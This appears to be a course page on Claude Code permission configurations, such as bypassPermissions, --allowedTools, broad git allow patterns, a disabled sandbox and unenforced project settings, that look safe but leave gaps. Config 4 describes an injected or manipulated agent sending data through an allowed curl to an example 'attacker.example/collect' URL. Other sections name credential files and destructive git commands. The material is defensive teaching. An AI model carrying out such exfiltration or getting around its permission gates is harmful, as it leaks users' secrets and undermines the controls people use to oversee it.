Deep Dive — Common Permission Configurations That Look Safe But Fail Silently

The core lab proved each boundary holds when you set it correctly. This page is about the harder failure: the boundary that looks set, passes a casual glance, and quietly does nothing. Every configuration below is one a competent engineer ships believing it is safe. Each has a gap that only shows up when something goes wrong — which is the worst time to discover it.

If the lab was "how the three gates work," this is "how to threat-model a config before you trust an agent behind it." The mental move throughout: stop reading a setting as its name and start reading it as its effect.

The threat model in one picture​

An agent config fails when a capability you assumed was closed is actually open. There are three capabilities worth tracking, and each safe-looking config below leaves exactly one of them open while appearing to close it.

Hold those three questions in mind. For each config below, ask: which of these did the author believe they closed, and did they?

Config 1 — bypassPermissions in a repo with no .gitignore discipline​

What it looks like: "I trust this task, and deny still protects me — the lab proved a deny on rm holds even under bypassPermissions. So bypass is a fine way to skip the prompts."

Why it is not safe: The lab did prove deny survives bypassPermissions — that part is true and worth knowing. The trap is concluding that deny is therefore enough. deny only covers the commands you listed. bypassPermissions removes the allow gate and the ask gate, so every command you did not anticipate runs with no check at all. In a repo without disciplined .gitignore and secret-file hygiene, "every command not denied" includes reading an untracked .env, writing to a credentials file, or committing a secret — none of which you thought to deny because you were focused on rm and terraform destroy.

Analogy: it is a night watchman who checks IDs against a list of banned names. Anyone specifically banned is turned away — but everyone not on the banned list walks straight in, because there is no "must be on the guest list" check anymore. deny is the banned list; allow/ask are the guest list. bypassPermissions fires the guest-list checker and keeps only the banned list.

You verified the deny-holds behavior in the lab, but see the other half directly — under bypassPermissions, a command that is neither allowed nor denied runs with no prompt:

cd /path/to/agentic-ops-lab
rm -f .claude/settings.local.json   # no allow, no deny for 'date'
claude -p "Run exactly: date +%s > ./bypass-proof.txt — then reply RAN or BLOCKED." --permission-mode bypassPermissions
cat ./bypass-proof.txt; rm -f ./bypass-proof.txt
Expected output
RAN
1753490000

date was neither allowed nor denied, and under any other posture it would have prompted. Under bypassPermissions it just ran. Now imagine that command were reading a secret or opening a socket — nothing in your config would have stopped it. The timestamp value will differ; the point is that it ran unopposed.

The fix: never run bypassPermissions where "runs anything not denied" is a real risk — which is any repo with credentials, network access, or untracked sensitive files. Use auto behind a deliberate deny when you want low-prompt autonomy; keep the allow/ask gates as the catch-all for the destructive command you did not foresee.

Config 2 — --allowedTools without any deny, assuming removal​

What it looks like: "I launched with --allowedTools Read,Grep,Edit. The agent can only read, search, and edit — I have restricted it to safe tools."

Why it is not safe: You already proved this one in the lab. --allowedTools is auto-approval, not availability. Bash was never removed; it merely prompts. And if this config is paired with a permissive posture (auto, dontAsk, bypass) or a workspace where the user reflexively approves prompts, Bash runs anyway. The word "allowed" reads like a whitelist that excludes everything else; its actual effect is a fast-pass for three tools and business-as-usual for the rest.

Analogy: you hired a contractor and gave three of them building keycards for after-hours access, believing that means only those three can enter. But the front door is still unlocked during the day for everyone — you controlled who skips the sign-in sheet, not who gets in.

The fix: to restrict availability, use --tools (positive allowlist), --disallowedTools (subtractive), or a deny rule on the tool. --allowedTools is for reducing prompts on tools you have already decided are available. Availability and auto-approval are different axes; set the one you actually mean.

Config 3 — auto mode with a broad allow pattern​

What it looks like: allow: ["Bash(git:*)"] under auto mode — "the agent can do git things without bugging me, and git is safe."

Why it is not safe: Bash(git:*) is a prefix match, and git is not a narrow verb. It matches git push --force, git reset --hard, git clean -fdx (deletes untracked files), git checkout . (discards local changes), and git config (can rewrite where a remote points). Under auto, all of those run with no prompt. A pattern you wrote to mean "safe read-only git" silently authorizes history-rewriting and working-tree-destroying git.

Analogy: it is a hall pass that says "science wing" but the science wing connects to the chemistry stockroom and the roof access. The label described your intent; the prefix match described the actual reach, and the two are not the same set.

The fix: narrow the pattern to the verbs you mean — Bash(git status:*), Bash(git diff:*), Bash(git log:*) — and put the dangerous verbs in deny (Bash(git push --force:*), Bash(git reset --hard:*)) so the broad-allow's tail cannot reach them. When you use auto, your allow breadth is your exposure; keep it as tight as the task needs and let deny backstop the sharp edges.

Config 4 — Sandbox disabled while the agent has network-capable tools​

What it looks like: "I gave the agent curl and WebFetch because it needs to check an internal endpoint. Permissions are tight — only the commands I listed. Good enough."

Why it is not safe: Permission rules gate which command runs; they do not gate where that command can reach. An allowed curl can hit localhost:8081 — or https://attacker.example/collect?data=.... If the agent is ever manipulated into building a malicious URL (via a poisoned file it read, an injected instruction, a compromised dependency), your permission rules happily run the exfiltration because curl was on the allow list. Without the sandbox, "allowed to use the network" means "allowed to use all of the network."

Analogy: you gave someone permission to make phone calls from the office phone. That is a rule about using the phone, not about who they can call. Without a wall on outbound numbers, "can make calls" includes calling the competitor and reading them your customer list.

The fix: back network-capable tools with the sandbox. As the core lab showed, "sandbox": { "enabled": true } cuts egress fail-closed — even an allowed curl cannot reach an external host. When a task genuinely needs one specific outbound host, grant that host explicitly rather than leaving the whole network open; the sandbox is the difference between "can use the network" and "can reach exactly this."

Config 5 — Project settings with no enterprise policy backup​

What it looks like: "Our team's safe boundary lives in the repo's .claude/settings.json, committed and reviewed. Everyone who clones the repo gets it."

Why it is not safe: Project settings are the lowest enforced layer in the precedence stack — every developer can override them with .claude/settings.local.json (git-ignored, invisible in review) or a CLI flag. Someone frustrated by prompts adds a broad allow to their local file, or runs --permission-mode bypassPermissions once "just to get unblocked," and your committed boundary is gone on that machine with no trace in the repo. A control that any user can silently opt out of is a convention, not a policy.

Analogy: it is a company handbook rule versus a door lock. The handbook says "do not enter the server room" — and depends entirely on everyone choosing to comply. The lock does not care about intent. Project settings are the handbook; enterprise managed policy is the lock.

The fix: anything that must hold regardless of developer behavior belongs in enterprise managed settings — the top of the hierarchy, which no project file or CLI flag can override. This is the operational reason the auth story from the lesson matters: enterprise deployment (Bedrock/Vertex with managed settings) is what turns your deny list from "a default developers can bypass" into "a boundary developers cannot." Use project settings for team defaults and convenience; use managed policy for the boundaries that are non-negotiable.

Under the hood: process containment and short-lived credentials​

Two patterns underpin why the sandbox is the load-bearing control, and both are worth understanding at the mechanism level.

Process containment — the agent's Bash is a child process, not a magic actor​

When the agent runs a command, it spawns a real OS child process. Everything that process can do is exactly what any process launched by your user can do: read every file your user can read, open any socket, inherit every environment variable in scope — including AWS_SECRET_ACCESS_KEY, GITHUB_TOKEN, or a kubeconfig path. The agent is not more contained than a shell script you ran yourself; by default it is exactly as contained, which is to say not at all.

This is why the sandbox is not optional hygiene for serious work — it is the only thing that makes the agent's child process less privileged than your login shell. Without it, "the agent read a file it shouldn't" and "a process running as you read a file" are the same event, and your permission rules never saw it because reading ~/.aws/credentials via an allowed cat is an allowed command.

Short-lived credentials — assume the agent's environment leaks​

Given process containment, treat every credential visible to the agent's process as potentially already exposed. The defense is not "hope it never reads them" — it is to make what it could read worthless quickly.

  • Never put long-lived static secrets in the agent's environment. No permanent AWS_ACCESS_KEY_ID, no non-expiring PATs in the shell that launches Claude Code.
  • Prefer short-TTL, auto-refreshed credentials — an assumed IAM role with a 15-minute session, an OIDC-federated token, a git credential helper that mints per-operation tokens. If the agent's process is compromised, the attacker inherits a credential that expires before it is useful.
  • Scope the credential to the task, not the human. The agent doing a read-only diagnostic should run under a role that can only read, so even a leaked token cannot destroy anything. This is least-privilege applied to the agent's identity — the same discipline as the auth-method choice from the lesson, pushed down to the token's permissions and lifetime.

The combination is defense in depth: the sandbox reduces the chance the credential leaks at all, and short-lived least-privilege credentials cap the damage if it does. Neither alone is sufficient; together they make "the agent's process was compromised" a survivable event instead of a breach.

Where you'll use this​

  • Reviewing a teammate's .claude/settings.json in a PR. You will now read each rule for its effect, not its label — catching the broad Bash(git:*) under auto, or the --allowedTools that restricts nothing.
  • Deciding what goes in managed policy vs. project settings (M8). The precedence stack tells you which boundaries must be enterprise-enforced because they cannot survive as project defaults.
  • Standing up an autonomous incident-response agent (M14, capstone). Before you let an agent act on production during an incident, you will threat-model its config against the three-capability picture: unanticipated destructive command, network egress, secret access — and back the answers with the sandbox and short-lived credentials rather than trust.
  • Onboarding the agent to a CI runner. Process containment is why you pin the version, scope the runner's credentials to the job, and run the agent's Bash sandboxed — a CI token with broad, long-lived scope in an unsandboxed agent process is the highest-value target you can hand an attacker.
